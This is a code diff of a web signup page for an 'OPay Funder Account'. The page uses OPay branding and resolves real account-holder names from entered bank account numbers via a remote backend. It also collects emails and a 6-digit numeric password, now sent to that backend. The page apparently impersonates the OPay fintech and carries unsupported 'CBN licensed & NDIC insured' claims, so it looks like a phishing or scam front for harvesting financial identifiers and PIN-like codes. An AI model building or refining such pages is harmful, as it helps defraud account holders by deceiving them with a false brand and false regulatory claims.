@@ -42,6 +42,21 @@
         .logo-center { text-align: center; }
         .logo-center img { width: 150px; height: 150px; object-fit: contain; }
 
+        /* Marquee Warning Box */
+        .warning-marquee {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 15px 0;
+        }
+
+        marquee {
+            font-size: 12px;
+            color: #856404;
+            font-weight: 500;
+        }
+
         .desc-text {
             font-size: 15px;
             color: #555;
@@ -178,6 +193,16 @@
             <img src="images/ppay.png" alt="OPay Logo">
         </div>
 
+        <!-- Warning Marquee -->
+        <div class="warning-marquee">
+            <marquee behavior="scroll" direction="left" scrollamount="3">
+                ⚠️ IMPORTANT: Please remember your email and password! There is NO password recovery feature. 
+                If you forget your email or password, you will need to create a new account. 
+                Each email can only be used for ONE account. Activation codes are sent to your email only once - 
+                if you lose it, you will need a new email address to register. Keep your credentials safe! 🔐
+            </marquee>
+        </div>
+
         <div class="desc-text">
             Get your <strong>OPay Funder Account</strong> here:<br>
             <span style="font-size:8px;">Enter your OPay account number to verify your identity</span>
@@ -197,7 +222,7 @@
             </div>
         </div>
 
-        <!-- Name Display - Will show REAL name from API -->
+        <!-- Name Display -->
         <div class="name-display">
             <i class="fas fa-user"></i> Account Name: <span class="name-value" id="accountName">—</span>
         </div>
@@ -210,12 +235,13 @@
             <input type="email" class="form-input" id="emailInput" placeholder="youremail@example.com">
         </div>
 
-        <!-- 6-Digit Code -->
+        <!-- Password -->
         <div style="margin-top: 12px;">
             <div class="form-label">
-                <i class="fas fa-lock"></i> Enter 6-digit code
+                <i class="fas fa-lock"></i> Create 6-digit password
             </div>
             <input type="password" class="form-input" id="codeInput" maxlength="6" placeholder="••••••" inputmode="numeric">
+            <small style="font-size: 10px; color: #999;">Choose a 6-digit password you will remember</small>
         </div>
 
         <button class="signup-btn" id="signupBtn">
@@ -236,10 +262,8 @@
     </div>
 
     <script>
-        // ============ YOUR BACKEND API URL (UPDATED WITH YOUR LIVE BACKEND) ============
-        const API_URL = 'https://opay-backend-api.onrender.com/api/resolve-account';
+        const API_URL = 'https://opay-backend-api.onrender.com';
         
-        // ============ VIBRATION FUNCTION ============
         function vibratePhone(duration = 100, pattern = null) {
             if (window.navigator && window.navigator.vibrate) {
                 if (pattern) window.navigator.vibrate(pattern);
@@ -247,18 +271,26 @@
             }
         }
         
-        // ============ GET REAL ACCOUNT NAME FROM PAYSTACK API ============
+        async function showAlert(icon, title, message, vibratePattern = null) {
+            if (vibratePattern) vibratePhone(0, vibratePattern);
+            else vibratePhone(200);
+            
+            return Swal.fire({
+                icon: icon,
+                title: title,
+                text: message,
+                confirmButtonColor: '#00B875',
+                confirmButtonText: 'OK'
+            });
+        }
+        
+        // Get real account name from Paystack
         async function getRealAccountName(accountNumber) {
             try {
-                const response = await fetch(API_URL, {
+                const response = await fetch(`${API_URL}/api/resolve-account`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        account_number: accountNumber,
-                        bank_code: 'opay'
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ account_number: accountNumber, bank_code: 'opay' })
                 });
                 
                 const data = await response.json();
@@ -269,27 +301,60 @@
                     return { success: false, message: data.message };
                 }
             } catch (error) {
-                console.error('API Error:', error);
-                return { success: false, message: 'Network error. Please check your connection.' };
+                return { success: false, message: 'Network error' };
             }
         }
         
-        // ============ SHOW ALERT WITH VIBRATION ============
-        async function showAlert(icon, title, message, vibratePattern = null) {
-            if (vibratePattern) vibratePhone(0, vibratePattern);
-            else vibratePhone(200);
-            
-            return Swal.fire({
-                icon: icon,
-                title: title,
-                text: message,
-                confirmButtonColor: '#00B875',
-                confirmButtonText: 'OK',
-                timer: icon === 'success' ? 2000 : null
-            });
+        // Check if email already exists
+        async function checkEmailExists(email) {
+            try {
+                const response = await fetch(`${API_URL}/api/check-email`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email })
+                });
+                const data = await response.json();
+                return data.exists;
+            } catch (error) {
+                return false;
+            }
         }
         
-        // ============ DOM ELEMENTS ============
+        // Check if account already exists
+        async function checkAccountExists(accountNumber) {
+            try {
+                const response = await fetch(`${API_URL}/api/check-account`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ account_number: accountNumber })
+                });
+                const data = await response.json();
+                return data.exists;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Create user
+        async function createUser(accountNumber, accountName, email, passwordCode) {
+            try {
+                const response = await fetch(`${API_URL}/api/create-user`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        account_number: accountNumber,
+                        account_name: accountName,
+                        email: email,
+                        password_code: passwordCode
+                    })
+                });
+                return await response.json();
+            } catch (error) {
+                return { success: false, message: 'Network error' };
+            }
+        }
+        
+        // DOM Elements
         const accountNumberInput = document.getElementById('accountNumber');
         const accountNameSpan = document.getElementById('accountName');
         const emailInput = document.getElementById('emailInput');
@@ -302,20 +367,17 @@
         let currentAccountName = '';
         let isVerifying = false;
         
-        // ============ ACCOUNT NUMBER LOOKUP (REAL API) ============
+        // Account number lookup
         accountNumberInput.addEventListener('input', async function(e) {
             let val = this.value.replace(/\D/g, '').slice(0, 10);
             this.value = val;
             
             if (val.length === 10 && !isVerifying) {
                 isVerifying = true;
-                
-                // Show loading
                 accountNameSpan.textContent = 'Verifying with OPay...';
                 accountNameSpan.style.color = '#e67e22';
                 vibratePhone(50);
                 
-                // Call real API
                 const result = await getRealAccountName(val);
                 
                 if (result.success) {
@@ -323,21 +385,16 @@
                     accountNameSpan.textContent = result.name;
                     accountNameSpan.style.color = '#00B875';
                     vibratePhone(0, [50, 50, 50]);
-                    await showAlert('success', 'Verified!', `Account name: ${result.name}`, [50, 50]);
                 } else {
                     currentAccountName = '';
                     accountNameSpan.textContent = 'Account not found';
                     accountNameSpan.style.color = '#e74c3c';
                     vibratePhone(0, [200, 100, 200]);
-                    await showAlert('error', 'Not Found', result.message || 'Account number not found in OPay database', [200, 100]);
                 }
-                
                 isVerifying = false;
-                
             } else if (val.length > 0 && val.length < 10) {
                 accountNameSpan.textContent = 'Enter 10 digits';
                 accountNameSpan.style.color = '#e67e22';
-                vibratePhone(100);
                 currentAccountName = '';
             } else {
                 accountNameSpan.textContent = '—';
@@ -346,21 +403,20 @@
             }
         });
         
-        // ============ CODE INPUT VALIDATION ============
+        // Password validation
         codeInput.addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '').slice(0, 6);
             this.value = val;
-            if (val.length === 6) vibratePhone(30);
         });
         
-        // ============ SIGN UP BUTTON ============
+        // Sign up button
         signupBtn.addEventListener('click', async function() {
             const accountNumber = accountNumberInput.value;
-            const email = emailInput.value.trim();
+            const email = emailInput.value.trim().toLowerCase();
             const code = codeInput.value;
             const terms = termsCheckbox.checked;
             
-            // Validation
+            // Validations
             if (accountNumber.length !== 10) {
                 await showAlert('error', 'Invalid Account', 'Please enter a valid 10-digit OPay account number', [200, 100]);
                 accountNumberInput.focus();
@@ -378,8 +434,24 @@
                 return;
             }
             
+            // Check if email already registered
+            const emailExists = await checkEmailExists(email);
+            if (emailExists) {
+                await showAlert('error', 'Email Already Registered', 'This email is already associated with an account. Each email can only be used once.', [200, 100, 200]);
+                emailInput.focus();
+                return;
+            }
+            
+            // Check if account already registered
+            const accountExists = await checkAccountExists(accountNumber);
+            if (accountExists) {
+                await showAlert('error', 'Account Already Registered', 'This account number is already registered. Please use a different account number.', [200, 100, 200]);
+                accountNumberInput.focus();
+                return;
+            }
+            
             if (code.length !== 6) {
-                await showAlert('error', 'Invalid Code', 'Please enter exactly 6 digits', [200, 100]);
+                await showAlert('error', 'Invalid Password', 'Please create a 6-digit password', [200, 100]);
                 codeInput.focus();
                 return;
             }
@@ -389,56 +461,55 @@
                 return;
             }
             
-            // Show loading
+            // Create account
             this.innerHTML = '<div class="spinner-sm"></div> Creating Account...';
             this.disabled = true;
-            
             vibratePhone(0, [100, 50, 100]);
             
-            // Save to localStorage
-            const userData = {
-                accountNumber: accountNumber,
-                accountName: currentAccountName,
-                email: email,
-                passwordCode: code,
-                createdAt: new Date().toISOString()
-            };
+            const result = await createUser(accountNumber, currentAccountName, email, code);
             
-            const existingUsers = JSON.parse(localStorage.getItem('opayUsers') || '[]');
-            existingUsers.push(userData);
-            localStorage.setItem('opayUsers', JSON.stringify(existingUsers));
-            localStorage.setItem('currentUser', JSON.stringify(userData));
-            
-            await showAlert('success', 'Account Created!', `Welcome ${currentAccountName}!\n\nYour OPay Funder account is ready.`, [100, 50, 100, 150]);
-            
-            setTimeout(() => {
-                window.location.href = 'login1.html';
-            }, 1500);
+            if (result.success) {
+                // Save to localStorage for login1.html
+                localStorage.setItem('pendingLogin', JSON.stringify({
+                    accountNumber: accountNumber,
+                    accountName: currentAccountName,
+                    email: email,
+                    activationCode: result.activation_code
+                }));
+                
+                await showAlert('success', 'Account Created!', 
+                    `Welcome ${currentAccountName}!\n\nYour activation code is: ${result.activation_code}\n\nPlease save this code. You will need it to activate your account.\n\nYou will now be redirected to login.`, 
+                    [100, 50, 100, 150]);
+                
+                setTimeout(() => {
+                    window.location.href = 'login1.html';
+                }, 2000);
+            } else {
+                await showAlert('error', 'Registration Failed', result.message, [200, 100, 200]);
+                this.innerHTML = 'SIGN UP';
+                this.disabled = false;
+            }
         });
         
-        // ============ NAVIGATION ============
         loginLink.addEventListener('click', (e) => {
             e.preventDefault();
-            vibratePhone(50);
             window.location.href = 'login1.html';
         });
         
         termsLink.addEventListener('click', async (e) => {
             e.preventDefault();
-            vibratePhone(0, [50, 50]);
             await showAlert('info', 'Terms & Conditions', 
                 '📜 OPay Funder Terms:\n\n' +
                 '• You must be 18+ years old\n' +
                 '• One account per user\n' +
-                '• OPay Funder is CBN licensed\n' +
-                '• NDIC insured up to N500,000\n' +
-                '• Your account name is verified via Paystack API',
-                [50, 50]
+                '• One email per account only\n' +
+                '• No password recovery available\n' +
+                '• Keep your activation code safe\n' +
+                '• CBN licensed & NDIC insured'
             );
         });
         
-        console.log('✓ OPay Create Account - REAL API Ready');
-        console.log('✓ Backend URL:', API_URL);
+        console.log('✓ Create.html loaded with new policies');
     </script>
 </body>
 </html>
